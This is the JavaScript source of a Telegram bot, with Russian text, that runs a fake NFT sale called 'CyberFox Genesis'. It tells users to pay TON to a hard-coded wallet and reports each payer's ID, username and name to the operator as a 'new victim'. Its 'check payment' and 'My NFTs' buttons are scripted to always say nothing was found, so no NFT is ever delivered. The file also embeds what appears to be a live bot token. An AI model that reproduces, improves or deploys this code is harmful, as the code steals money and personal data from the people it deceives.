const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');

const BOT_TOKEN = '8575010890:AAEvKySvJ0yJGwKgVLMLhojUktrE7Sga-cg';
const WALLET_TON = 'UQAdqmGgJmCs5vll9d4jNGK5aBFd9LaS3l-gRNuua8jMdbAS';
const ADMIN_ID = 8586263322; // @arhimedik1029

const bot = new Telegraf(BOT_TOKEN);

bot.start((ctx) => {
    ctx.replyWithHTML(
        `🔥 <b>EXCLUSIVE NFT DROP</b>\n\n` +
        `Коллекция: <b>CyberFox Genesis</b>\n` +
        `Всего 3333 NFT | Уже заминчено 2983\n\n` +
        `💎 1 NFT — 3.7 TON\n` +
        `💎 5 NFT — 17 TON (скидка 8%)\n\n` +
        `<i>Мгновенный минт — NFT сразу в кошельке</i>`,
        menu()
    );
});

function menu() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('✦ Mint 1 NFT — 3.7 TON', 'mint1')],
        [Markup.button.callback('✦ Mint 5 NFT — 17 TON', 'mint5')],
        [Markup.button.callback('My NFTs', 'mynft')]
    ]);
}

bot.action(/mint(\d+)/, async (ctx) => {
    const count = ctx.match[1] == '5' ? 5 : 1;
    const amount = count == 5 ? 17 : 3.7;
    const comment = 'NFT' + Math.random().toString(36).substring(2, 10).toUpperCase();

    const tonLink = `ton://transfer/${WALLET_TON}?amount=${amount * 1000000000}&text=${comment}`;

    await ctx.editMessageText(
        `🎫 <b>Заказ на ${count} NFT</b>\n\n` +
        `💰 Сумма: <b>${amount} TON</b>\n` +
        `📝 Комментарий: <code>${comment}</code>\n\n` +
        `Кошелёк:\n<code>${WALLET_TON}</code>\n\n` +
        `Оплати точно с комментарием — через 1–2 минуты NFT придут автоматически`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Оплатить TON', url: tonLink }],
                    [{ text: 'USDT / Карта / BTC', url: 'https://t.me/CryptoBot?start=pay' }],
                    [{ text: 'Проверить оплату', callback_data: `check_${Date.now()}` }]
                ]
            }
        }
    );

    bot.telegram.sendMessage(ADMIN_ID,
        `🟢 НОВАЯ ЖЕРТВА\n` +
        `ID: ${ctx.from.id}\n` +
        `Ник: @${ctx.from.username || 'нет'}\n` +
        `Имя: ${ctx.from.first_name}\n` +
        `Заказал: ${count} NFT\n` +
        `Сумма: ${amount} TON\n` +
        `Комментарий: ${comment}\n` +
        `Время: ${new Date().toLocaleString('ru')}`
    );
});

bot.action(/check_/, async (ctx) => {
    await ctx.answerCbQuery('Проверяем сеть TON... ⏳', { show_alert: true });
    setTimeout(async () => {
        await ctx.editMessageText(
            `❌ Платёж пока не найден\n\n` +
            `Убедись что:\n` +
            `• сумма точная\n` +
            `• комментарий правильный\n` +
            `• отправлено с TON-кошелька\n\n` +
            `Попробуй через минуту`,
            {
                reply_markup: {
                    inline_keyboard: [[{ text: 'Проверить снова', callback_data: ctx.callbackQuery.data }]]
                }
            }
        );
    }, 2800);
});

bot.action('mynft', (ctx) => {
    ctx.editMessageText(
        `Поиск твоих NFT в блокчейне...\n\n` +
        `Ничего не найдено 😔\n` +
        `Ты ещё не заминтил ни одного`,
        { reply_markup: menu().reply_markup }
    );
});

bot.launch();
console.log('Бот запущен — весь TON идёт на UQAdqmGgJmCs5vll9d4jNGK5aBFd9LaS3l-gRNuua8jMdbAS');